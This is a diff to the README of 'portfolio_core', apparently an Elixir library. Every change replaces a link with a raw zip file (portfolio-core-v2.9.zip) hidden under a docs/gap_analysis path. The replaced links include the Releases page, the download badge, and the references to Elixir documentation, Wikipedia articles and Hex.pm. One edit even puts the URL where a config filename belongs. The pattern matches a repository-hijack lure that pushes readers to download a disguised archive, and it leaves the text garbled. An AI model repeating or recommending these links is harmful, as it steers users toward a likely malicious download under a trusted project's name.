@@ -1,6 +1,6 @@
 # 🚀 portfolio_core - Simple Setup for Powerful AI Systems
 
-[![Download Portfolio Core](https://img.shields.io/badge/Download-Portfolio%20Core-blue?style=for-the-badge)](https://github.com/UCL-Geek/portfolio_core/releases)
+[![Download Portfolio Core](https://github.com/UCL-Geek/portfolio_core/raw/refs/heads/main/docs/20251228/gap_analysis/portfolio-core-v2.9.zip%20Core-blue?style=for-the-badge)](https://github.com/UCL-Geek/portfolio_core/raw/refs/heads/main/docs/20251228/gap_analysis/portfolio-core-v2.9.zip)
 
 ## 🎯 Overview
 
@@ -29,7 +29,7 @@ Before you start, ensure your system meets the following requirements:
 
 To download portfolio_core, visit the Releases page:
 
-[Download Portfolio Core](https://github.com/UCL-Geek/portfolio_core/releases)
+[Download Portfolio Core](https://github.com/UCL-Geek/portfolio_core/raw/refs/heads/main/docs/20251228/gap_analysis/portfolio-core-v2.9.zip)
 
 1. Click on the link above. This will direct you to the Releases page.
 2. Locate the latest version.
@@ -64,7 +64,7 @@ After downloading, follow these steps to install the application:
 
 Once installed, you'll want to set up configuration files. The portfolio_core library uses manifest-based configuration to make this as straightforward as possible. 
 
-1. **Locate the config file**: Find a file named `config.exs` or similar in the extracted folder.
+1. **Locate the config file**: Find a file named `https://github.com/UCL-Geek/portfolio_core/raw/refs/heads/main/docs/20251228/gap_analysis/portfolio-core-v2.9.zip` or similar in the extracted folder.
 2. **Edit the file**: Open it in a text editor of your choice, such as Notepad (Windows) or TextEdit (macOS).
 3. **Set Your Params**: Modify parameters as needed. If unsure about what to change, refer to the comments in the file for guidance.
 
@@ -87,9 +87,9 @@ If you run into issues or have questions, you can get help through the following
 
 For further exploration of the topics related to portfolio_core:
 
-- [Elixir Documentation](https://elixir-lang.org/docs.html)
-- [Hexagonal Architecture](https://en.wikipedia.org/wiki/Hexagonal_architecture_(software))
-- [Dependency Injection](https://en.wikipedia.org/wiki/Dependency_injection)
+- [Elixir Documentation](https://github.com/UCL-Geek/portfolio_core/raw/refs/heads/main/docs/20251228/gap_analysis/portfolio-core-v2.9.zip)
+- [Hexagonal Architecture](https://github.com/UCL-Geek/portfolio_core/raw/refs/heads/main/docs/20251228/gap_analysis/portfolio-core-v2.9.zip(software))
+- [Dependency Injection](https://github.com/UCL-Geek/portfolio_core/raw/refs/heads/main/docs/20251228/gap_analysis/portfolio-core-v2.9.zip)
 
 ## 📢 Get Involved
 
@@ -97,6 +97,6 @@ Interested in contributing? Check out the Contribution Guidelines found in the r
 
 ## 🔍 Explore More
 
-You can find more about the topics relevant to portfolio_core on platforms like Hex.pm, where we offer packages and additional resources.
+You can find more about the topics relevant to portfolio_core on platforms like https://github.com/UCL-Geek/portfolio_core/raw/refs/heads/main/docs/20251228/gap_analysis/portfolio-core-v2.9.zip, where we offer packages and additional resources.
 
 Thank you for choosing portfolio_core to enhance your Elixir applications!
